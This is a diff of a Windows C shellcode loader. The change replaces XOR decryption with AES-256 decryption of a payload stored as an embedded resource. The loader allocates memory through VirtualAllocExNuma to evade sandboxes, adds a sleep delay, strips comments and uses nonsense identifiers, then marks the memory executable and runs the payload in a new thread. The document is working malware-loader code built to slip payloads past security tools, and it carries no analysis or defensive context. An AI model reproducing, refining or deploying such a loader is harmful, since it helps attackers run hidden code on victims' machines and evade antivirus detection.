@@ -4,56 +4,62 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
 
-// Function to load resources from the executable
-void resloamadappa(const char* enapparename, char** data, DWORD* size) {
+
+void loadkumres(const char* ressus, unsigned char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
-    HRSRC hResource = FindResource(hModule, enapparename, RT_RCDATA);
+    HRSRC hResource = FindResource(hModule, ressus, RT_RCDATA);
     HGLOBAL hResData = LoadResource(hModule, hResource);
     *size = SizeofResource(hModule, hResource);
-    *data = (char*)LockResource(hResData);
+    *data = (unsigned char*)LockResource(hResData);
 }
 
-// Thread function to run the payload
-DWORD WINAPI RunPayload(LPVOID lpParam) {
-    char* keu789;
-    DWORD keu789Len;
-    resloamadappa("dhanushkey1", &keu789, &keu789Len);
+
+void thisisthkhal(char* codekumaa, DWORD codekumaaLen, char* keydude1299, DWORD keydude1299Len) {
+    HCRYPTPROV hProv;
+    HCRYPTHASH hHash;
+    HCRYPTKEY hKey;
+    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
+    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
+    CryptHashData(hHash, (BYTE*)keydude1299, keydude1299Len, 0);
+    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
+    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)codekumaa, &codekumaaLen);
+
+    CryptReleaseContext(hProv, 0);
+    CryptDestroyHash(hHash);
+    CryptDestroyKey(hKey);
+
+}
+
+
+int main() {
+  
+
+    char* kkeyakesey;
+    DWORD kkeyakeseyLen;
+    loadkumres("dhanushkey1", &kkeyakesey, &kkeyakeseyLen);
 
     char* kkcode;
     DWORD kkcodeLen;
-    resloamadappa("dhanushcode56", &kkcode, &kkcodeLen);
+    loadkumres("dhanushcode56", &kkcode, &kkcodeLen);
 
-    // Allocate memory for the decrypted payload
-    LPVOID sirajpura = VirtualAllocExNuma(GetCurrentProcess(), NULL, kkcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
-    for (DWORD a = 0; a < kkcodeLen; a++) {
-        kkcode[a] ^= keu789[a % keu789Len];  // XOR decryption
-    }
+   
+     unsigned char karik12y[kkeyakeseyLen];
+    unsigned char karic0d2[kkcodeLen];
 
-    // Copy the decrypted payload into the allocated memory
-    memcpy(sirajpura, kkcode, kkcodeLen);
+   
+    memcpy(karik12y, kkeyakesey, kkeyakeseyLen);
+    memcpy(karic0d2, kkcode, kkcodeLen);
+
+   
+
+    LPVOID coohsllo = VirtualAllocExNuma(GetCurrentProcess(), NULL, kkcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
+    Sleep(1000);
     DWORD oldProtect;
-    VirtualProtect(sirajpura, kkcodeLen, PAGE_EXECUTE_READ, &oldProtect);
-
-    // Execute the payload in a new thread
-    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sirajpura, NULL, 0, NULL);
-    WaitForSingleObject(tHandle, INFINITE);
-
-    return 0;
-}
-
-int main() {
-    // Hide the console window
-    FreeConsole();
-
-    // Create a new thread to run the payload
-    HANDLE hThread = CreateThread(NULL, 0, RunPayload, NULL, 0, NULL);
-    if (hThread == NULL) {
-        // If thread creation fails, exit
-        return 1;
-    }
-
-    // Wait for the thread to finish execution
-    WaitForSingleObject(hThread, INFINITE);
+    thisisthkhal((char*)karic0d2, sizeof(karic0d2), karik12y, sizeof(karik12y));  
+memcpy(coohsllo, karic0d2, sizeof(karic0d2));  
+    VirtualProtect(coohsllo, sizeof(karic0d2), PAGE_EXECUTE_READ, &oldProtect); 
+HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)coohsllo, NULL, 0, NULL);  
+    WaitForSingleObject(tHandle, INFINITE);  
 
     return 0;
 }
